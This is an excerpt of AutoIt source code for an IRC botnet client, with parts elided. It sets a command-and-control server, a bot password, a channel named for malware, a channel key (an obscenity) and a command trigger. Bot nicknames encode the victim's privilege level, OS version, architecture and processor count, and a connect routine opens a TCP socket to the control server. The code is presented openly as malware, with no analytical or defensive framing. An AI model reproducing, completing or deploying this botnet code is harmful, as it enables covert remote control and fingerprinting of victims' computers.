...
Else
	$priv = "U"
EndIf
Global $nodes = StringSplit("irc.bullshit.org:6667|", "|", 3)
...
Global $botpassword = "pleasedontblacklistautoit"
Global $nickformat = $priv & "[" & @OSVersion & "|" & @OSArch & "|" & EnvGet("NUMBER_OF_PROCESSORS") & "]"
Global $botid = randID()
Global $nick = $nickformat & $botid
Global $channel = "#fortheloveofmalware"
Global $key = "isuckcock"
Global $trigger = "!"
...
Func connect($nodes)
	For $i = 1 To UBound($nodes) - 1
		$mynode = $nodes[$i]
		$sock = TCPConnect(TCPNameToIP(StringSplit($mynode, ":")[0]), Number(StringSplit($mynode, ":")[1]))
		If $sock <> -1 Then
			ExitLoop
		EndIf
	Next
